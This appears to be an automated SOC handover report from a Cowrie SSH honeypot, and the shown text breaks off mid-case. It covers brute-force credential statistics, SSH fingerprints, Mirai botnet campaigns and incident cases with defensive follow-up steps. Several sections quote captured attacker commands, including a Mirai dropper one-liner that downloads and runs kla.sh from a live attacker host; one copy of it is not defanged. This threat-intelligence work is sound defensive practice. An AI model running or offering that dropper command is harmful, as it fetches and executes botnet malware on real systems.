# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-22 |
| **Generated At** | 2026-11-22T03:58:40Z |
| **Shift Time** | 03:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **90** |
| Confirmed Threats | **81** |
| False Positives Filtered | **9** (10.0%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **17** |
| High Severity Cases | **59** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **31** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **326** |
| Unique Credential Pairs | **299** |
| Unique Usernames | **134** |
| Unique Passwords | **250** |
| Successful Auth Pairs | **319** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 122 |
| `admin` | 29 |
| `support` | 9 |
| `test` | 6 |
| `user` | 5 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 12 |
| `1234` | 9 |
| `admin` | 8 |
| `` | 7 |
| `support` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 7 |
| `nobody` | `` | 3 |
| `usuario` | `usuario` | 3 |
| `root` | `111111` | 3 |
| `root` | `` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `nobody` | `` | `80.94.95.118` | 2026-11-22T00:51:03 |
| `nobody` | `` | `10.0.0.73` | 2026-11-22T00:51:31 |
| `usuario` | `usuario` | `80.94.95.118` | 2026-11-22T00:51:37 |
| `support` | `support` | `10.0.0.73` | 2026-11-22T00:51:42 |
| `git` | `git` | `10.0.0.73` | 2026-11-22T00:52:37 |
| `admin` | `1qaz2wsx` | `80.94.95.118` | 2026-11-22T00:53:29 |
| `git` | `git` | `80.94.95.118` | 2026-11-22T00:54:26 |
| `usuario` | `usuario` | `138.226.239.233` | 2026-11-22T00:55:24 |
| `mysql` | `` | `10.0.0.73` | 2026-11-22T00:56:30 |
| `support` | `support` | `176.53.159.196` | 2026-11-22T00:58:50 |
| `root` | `!root` | `92.118.39.14` | 2026-11-22T01:10:38 |
| `root` | `111111` | `92.118.39.14` | 2026-11-22T01:12:43 |
| `root` | `123123` | `92.118.39.14` | 2026-11-22T01:14:47 |
| `root` | `123321` | `92.118.39.14` | 2026-11-22T01:16:50 |
| `root` | `1234` | `92.118.39.14` | 2026-11-22T01:18:53 |
| `root` | `12345` | `92.118.39.14` | 2026-11-22T01:20:56 |
| `root` | `1234567` | `92.118.39.14` | 2026-11-22T01:24:53 |
| `root` | `` | `160.119.66.206` | 2026-11-22T01:25:04 |
| `support` | `support` | `177.54.97.235` | 2026-11-22T01:25:14 |
| `root` | `12345678` | `92.118.39.14` | 2026-11-22T01:26:52 |
_… 299 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **90** |
| Sessions with Fingerprint | **13** |
| Unique HASSH Fingerprints | **13** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 55 |
| OpenSSH | 5 |
| AsyncSSH (Python) | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 44 | 2 |
| `7d01d047ace6...` | Mirai/variant | 2 | 2 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `16443846184e...` | Generic scanner | 2 | 2 |
| `fda360b1b4f4...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 44 | 2 | Mirai/variant |
| `95420f9d932d...` | OpenSSH | 4 | 4 | — |
| `7d01d047ace6...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `fda360b1b4f4...` | AsyncSSH (Python) | 2 | 1 | Mirai/variant |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **51** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1105, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
/bin/busybox TEST
```
```
cat /proc
```
```
./
```
Source IPs: `169.128.70.53`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **15** |
| High-Risk ASNs | **10** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 22 | HIGH |
| `AS12389` | PJSC Rostelecom | 2 | MEDIUM |
| `AS52988` | PLENA TELECOM | 1 | LOW |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS198364` | BANATSYNC SRL | 1 | HIGH |
| `AS7029` | Windstream Communications LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (58)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-5d1d9363bbc2

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-11-22 00:51 |
| **Last Seen** | 2026-11-22 00:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 00:51:03` | `cowrie.session.connect` |
| `2026-11-22 00:51:03` | `cowrie.client.version` |
| `2026-11-22 00:51:03` | `cowrie.client.kex` |
| `2026-11-22 00:51:03` | `cowrie.login.success` |
| `2026-11-22 00:51:03` | `cowrie.direct-tcpip.request` |
| `2026-11-22 00:51:04` | `cowrie.direct-tcpip.ja4` |
| `2026-11-22 00:51:04` | `cowrie.direct-tcpip.data` |
| `2026-11-22 00:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c58eea24ae

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-22 00:55 |
| **Last Seen** | 2026-11-22 00:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 00:55:23` | `cowrie.session.connect` |
| `2026-11-22 00:55:23` | `cowrie.client.version` |
| `2026-11-22 00:55:23` | `cowrie.client.kex` |
| `2026-11-22 00:55:24` | `cowrie.login.success` |
| `2026-11-22 00:55:24` | `cowrie.direct-tcpip.request` |
| `2026-11-22 00:55:24` | `cowrie.direct-tcpip.ja4` |
| `2026-11-22 00:55:24` | `cowrie.direct-tcpip.data` |
| `2026-11-22 00:55:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cda4bc53fa5f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-22 00:58 |
| **Last Seen** | 2026-11-22 00:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 00:58:49` | `cowrie.session.connect` |
| `2026-11-22 00:58:49` | `cowrie.client.version` |
| `2026-11-22 00:58:50` | `cowrie.client.kex` |
| `2026-11-22 00:58:50` | `cowrie.login.success` |
| `2026-11-22 00:58:50` | `cowrie.direct-tcpip.request` |
| `2026-11-22 00:58:50` | `cowrie.direct-tcpip.data` |
| `2026-11-22 00:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b62c27f9b185

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:10 |
| **Last Seen** | 2026-11-22 01:10 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e2cea897777e86de84680487d5c9540f_small_control'"'"' '"'"'check_e2cea897777e86de84680487d5c9540f'"'"'', printf '\n%s|%s\n' 'check_e2cea897777e86de84680487d5c9540f_small_control' 'check_e2cea897777e86de84680487d5c9540f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e2cea897777e86de84680487d5c9540f_small_math'"'"' "$((237*547+57))"', (237*547+57, printf '\n%s|%s\n' 'check_e2cea897777e86de84680487d5c9540f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:10:35` | `cowrie.session.connect` |
| `2026-11-22 01:10:36` | `cowrie.client.version` |
| `2026-11-22 01:10:36` | `cowrie.client.kex` |
| `2026-11-22 01:10:38` | `cowrie.login.success` |
| `2026-11-22 01:10:40` | `cowrie.client.size` |
| `2026-11-22 01:10:41` | `cowrie.session.params` |
| `2026-11-22 01:10:42` | `cowrie.command.input` |
| `2026-11-22 01:10:42` | `cowrie.command.input` |
| `2026-11-22 01:10:42` | `cowrie.command.input` |
| `2026-11-22 01:10:42` | `cowrie.command.input` |
| `2026-11-22 01:10:42` | `cowrie.command.input` |
| `2026-11-22 01:10:42` | `cowrie.command.input` |
| `2026-11-22 01:10:42` | `cowrie.command.input` |
| `2026-11-22 01:10:42` | `cowrie.command.input` |
| `2026-11-22 01:10:42` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bcf3a492637

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:12 |
| **Last Seen** | 2026-11-22 01:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a8c7e7b78a57336fe9a61bfdd3b62488_small_control'"'"' '"'"'check_a8c7e7b78a57336fe9a61bfdd3b62488'"'"'', printf '\n%s|%s\n' 'check_a8c7e7b78a57336fe9a61bfdd3b62488_small_control' 'check_a8c7e7b78a57336fe9a61bfdd3b62488', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a8c7e7b78a57336fe9a61bfdd3b62488_small_math'"'"' "$((337*851+43))"', (337*851+43, printf '\n%s|%s\n' 'check_a8c7e7b78a57336fe9a61bfdd3b62488_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:12:40` | `cowrie.session.connect` |
| `2026-11-22 01:12:40` | `cowrie.client.version` |
| `2026-11-22 01:12:40` | `cowrie.client.kex` |
| `2026-11-22 01:12:43` | `cowrie.login.success` |
| `2026-11-22 01:12:45` | `cowrie.client.size` |
| `2026-11-22 01:12:46` | `cowrie.session.params` |
| `2026-11-22 01:12:46` | `cowrie.command.input` |
| `2026-11-22 01:12:46` | `cowrie.command.input` |
| `2026-11-22 01:12:46` | `cowrie.command.input` |
| `2026-11-22 01:12:46` | `cowrie.command.input` |
| `2026-11-22 01:12:46` | `cowrie.command.input` |
| `2026-11-22 01:12:46` | `cowrie.command.input` |
| `2026-11-22 01:12:46` | `cowrie.command.input` |
| `2026-11-22 01:12:46` | `cowrie.command.input` |
| `2026-11-22 01:12:46` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f58f1bed281a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:14 |
| **Last Seen** | 2026-11-22 01:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7deda6c7c02af3c4539c4209cdd0c2f8_small_control'"'"' '"'"'check_7deda6c7c02af3c4539c4209cdd0c2f8'"'"'', printf '\n%s|%s\n' 'check_7deda6c7c02af3c4539c4209cdd0c2f8_small_control' 'check_7deda6c7c02af3c4539c4209cdd0c2f8', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_7deda6c7c02af3c4539c4209cdd0c2f8_small_math'"'"' "$((334*83+34))"', (334*83+34, printf '\n%s|%s\n' 'check_7deda6c7c02af3c4539c4209cdd0c2f8_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:14:44` | `cowrie.session.connect` |
| `2026-11-22 01:14:44` | `cowrie.client.version` |
| `2026-11-22 01:14:44` | `cowrie.client.kex` |
| `2026-11-22 01:14:47` | `cowrie.login.success` |
| `2026-11-22 01:14:49` | `cowrie.client.size` |
| `2026-11-22 01:14:50` | `cowrie.session.params` |
| `2026-11-22 01:14:51` | `cowrie.command.input` |
| `2026-11-22 01:14:51` | `cowrie.command.input` |
| `2026-11-22 01:14:51` | `cowrie.command.input` |
| `2026-11-22 01:14:51` | `cowrie.command.input` |
| `2026-11-22 01:14:51` | `cowrie.command.input` |
| `2026-11-22 01:14:51` | `cowrie.command.input` |
| `2026-11-22 01:14:51` | `cowrie.command.input` |
| `2026-11-22 01:14:51` | `cowrie.command.input` |
| `2026-11-22 01:14:51` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82eda89528e0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:16 |
| **Last Seen** | 2026-11-22 01:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cf7c2f49657dc32a525fca4cc718531a_small_control'"'"' '"'"'check_cf7c2f49657dc32a525fca4cc718531a'"'"'', printf '\n%s|%s\n' 'check_cf7c2f49657dc32a525fca4cc718531a_small_control' 'check_cf7c2f49657dc32a525fca4cc718531a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_cf7c2f49657dc32a525fca4cc718531a_small_math'"'"' "$((276*214+58))"', (276*214+58, printf '\n%s|%s\n' 'check_cf7c2f49657dc32a525fca4cc718531a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:16:47` | `cowrie.session.connect` |
| `2026-11-22 01:16:47` | `cowrie.client.version` |
| `2026-11-22 01:16:47` | `cowrie.client.kex` |
| `2026-11-22 01:16:50` | `cowrie.login.success` |
| `2026-11-22 01:16:52` | `cowrie.client.size` |
| `2026-11-22 01:16:53` | `cowrie.session.params` |
| `2026-11-22 01:16:54` | `cowrie.command.input` |
| `2026-11-22 01:16:54` | `cowrie.command.input` |
| `2026-11-22 01:16:54` | `cowrie.command.input` |
| `2026-11-22 01:16:54` | `cowrie.command.input` |
| `2026-11-22 01:16:54` | `cowrie.command.input` |
| `2026-11-22 01:16:54` | `cowrie.command.input` |
| `2026-11-22 01:16:54` | `cowrie.command.input` |
| `2026-11-22 01:16:54` | `cowrie.command.input` |
| `2026-11-22 01:16:54` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a5b69581d09

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:18 |
| **Last Seen** | 2026-11-22 01:18 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8c0b0eee2362522dde941462451737c0_small_control'"'"' '"'"'check_8c0b0eee2362522dde941462451737c0'"'"'', printf '\n%s|%s\n' 'check_8c0b0eee2362522dde941462451737c0_small_control' 'check_8c0b0eee2362522dde941462451737c0', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8c0b0eee2362522dde941462451737c0_small_math'"'"' "$((957*850+59))"', (957*850+59, printf '\n%s|%s\n' 'check_8c0b0eee2362522dde941462451737c0_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:18:49` | `cowrie.session.connect` |
| `2026-11-22 01:18:50` | `cowrie.client.version` |
| `2026-11-22 01:18:50` | `cowrie.client.kex` |
| `2026-11-22 01:18:53` | `cowrie.login.success` |
| `2026-11-22 01:18:55` | `cowrie.client.size` |
| `2026-11-22 01:18:56` | `cowrie.session.params` |
| `2026-11-22 01:18:57` | `cowrie.command.input` |
| `2026-11-22 01:18:57` | `cowrie.command.input` |
| `2026-11-22 01:18:57` | `cowrie.command.input` |
| `2026-11-22 01:18:57` | `cowrie.command.input` |
| `2026-11-22 01:18:57` | `cowrie.command.input` |
| `2026-11-22 01:18:57` | `cowrie.command.input` |
| `2026-11-22 01:18:57` | `cowrie.command.input` |
| `2026-11-22 01:18:57` | `cowrie.command.input` |
| `2026-11-22 01:18:57` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e2491e4b3b0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:20 |
| **Last Seen** | 2026-11-22 01:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4f7a72410d35380b156623712d6afbfb_small_control'"'"' '"'"'check_4f7a72410d35380b156623712d6afbfb'"'"'', printf '\n%s|%s\n' 'check_4f7a72410d35380b156623712d6afbfb_small_control' 'check_4f7a72410d35380b156623712d6afbfb', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4f7a72410d35380b156623712d6afbfb_small_math'"'"' "$((407*511+74))"', (407*511+74, printf '\n%s|%s\n' 'check_4f7a72410d35380b156623712d6afbfb_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:20:52` | `cowrie.session.connect` |
| `2026-11-22 01:20:53` | `cowrie.client.version` |
| `2026-11-22 01:20:53` | `cowrie.client.kex` |
| `2026-11-22 01:20:56` | `cowrie.login.success` |
| `2026-11-22 01:20:58` | `cowrie.client.size` |
| `2026-11-22 01:20:59` | `cowrie.session.params` |
| `2026-11-22 01:21:00` | `cowrie.command.input` |
| `2026-11-22 01:21:00` | `cowrie.command.input` |
| `2026-11-22 01:21:00` | `cowrie.command.input` |
| `2026-11-22 01:21:00` | `cowrie.command.input` |
| `2026-11-22 01:21:00` | `cowrie.command.input` |
| `2026-11-22 01:21:00` | `cowrie.command.input` |
| `2026-11-22 01:21:00` | `cowrie.command.input` |
| `2026-11-22 01:21:00` | `cowrie.command.input` |
| `2026-11-22 01:21:00` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-289cb4186164

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-11-22 01:24 |
| **Last Seen** | 2026-11-22 01:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_401e10f9e57e74cc78571b78ce3345bf_small_control'"'"' '"'"'check_401e10f9e57e74cc78571b78ce3345bf'"'"'', printf '\n%s|%s\n' 'check_401e10f9e57e74cc78571b78ce3345bf_small_control' 'check_401e10f9e57e74cc78571b78ce3345bf', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_401e10f9e57e74cc78571b78ce3345bf_small_math'"'"' "$((463*382+22))"', (463*382+22, printf '\n%s|%s\n' 'check_401e10f9e57e74cc78571b78ce3345bf_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:24:49` | `cowrie.session.connect` |
| `2026-11-22 01:24:50` | `cowrie.client.version` |
| `2026-11-22 01:24:50` | `cowrie.client.kex` |
| `2026-11-22 01:24:53` | `cowrie.login.success` |
| `2026-11-22 01:24:55` | `cowrie.client.size` |
| `2026-11-22 01:24:56` | `cowrie.session.params` |
| `2026-11-22 01:24:57` | `cowrie.command.input` |
| `2026-11-22 01:24:57` | `cowrie.command.input` |
| `2026-11-22 01:24:57` | `cowrie.command.input` |
| `2026-11-22 01:24:57` | `cowrie.command.input` |
| `2026-11-22 01:24:57` | `cowrie.command.input` |
| `2026-11-22 01:24:57` | `cowrie.command.input` |
| `2026-11-22 01:24:57` | `cowrie.command.input` |
| `2026-11-22 01:24:57` | `cowrie.command.input` |
| `2026-11-22 01:24:57` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2c500bfb1d6

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-11-22 01:25 |
| **Last Seen** | 2026-11-22 01:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `enable, linuxshell, system, sh, ls /home; /bin/busybox BOTNET` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:25:04` | `cowrie.session.connect` |
| `2026-11-22 01:25:04` | `cowrie.login.success` |
| `2026-11-22 01:25:05` | `cowrie.session.params` |
| `2026-11-22 01:25:05` | `cowrie.command.input` |
| `2026-11-22 01:25:05` | `cowrie.command.failed` |
| `2026-11-22 01:25:05` | `cowrie.command.input` |
| `2026-11-22 01:25:05` | `cowrie.command.failed` |
| `2026-11-22 01:25:05` | `cowrie.command.input` |
| `2026-11-22 01:25:05` | `cowrie.command.failed` |
| `2026-11-22 01:25:05` | `cowrie.command.input` |
| `2026-11-22 01:25:05` | `cowrie.command.input` |
| `2026-11-22 01:25:05` | `cowrie.command.input` |
| `2026-11-22 01:25:05` | `cowrie.session.file_download` |
| `2026-11-22 01:25:06` | `cowrie.session.file_download` |
| `2026-11-22 01:25:06` | `cowrie.session.file_download` |
| … | _3 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `160.119.66[.]206` to AbuseIPDB if not already reported
- [ ] Block `160.119.66[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b25da5375626

| Field | Detail |
|---|---|
| **Source IP** | `160.119.66[.]206` |
| **First Seen** | 2026-11-22 01:25 |
| **Last Seen** | 2026-11-22 01:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh hxxp://160.119.66[.]206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&` |
| **Download Attempts** | hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh, hxxp://160.119.66[.]206/bins/kla.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 01:25:05` | `cowrie.session.connect` |
| `2026-11-22 01:25:06` | `cowrie.login.success` |
| `2026-11-22 01:25:06` | `cowrie.session.params` |
| `2026-11-22 01:25:06` | `cowrie.command.input` |
| `2026-11-22 01:25:06` | `cowrie.session.file_download` |
| `2026-11-22 01:25:07` | `cowrie.session.file_download` |
| `2026-11-22 01:25:07` | `cowrie.session.file_download` |
| `2026-11-22 01:25:07` | `cowrie.session.file_download.failed` |
| `2026-11-22 01:25:09` | `cowrie.log.closed` |
| `2026-11-22 01:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
